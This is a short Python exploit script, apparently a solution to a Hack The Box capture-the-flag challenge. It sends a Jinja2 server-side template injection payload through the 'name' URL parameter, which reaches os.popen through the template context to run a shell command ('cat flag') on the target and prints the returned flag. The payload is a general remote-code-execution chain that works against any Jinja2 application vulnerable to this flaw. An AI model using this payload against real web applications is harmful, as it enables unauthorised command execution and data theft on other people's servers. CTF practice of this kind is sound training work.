#!/usr/bin/python3
from requests import get
from sys import argv
from re import findall

url = argv[1]

payload = r"/?name={{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}"

r = get(url + payload)

print(findall("HTB{.*", r.text)[0].split("<")[0])
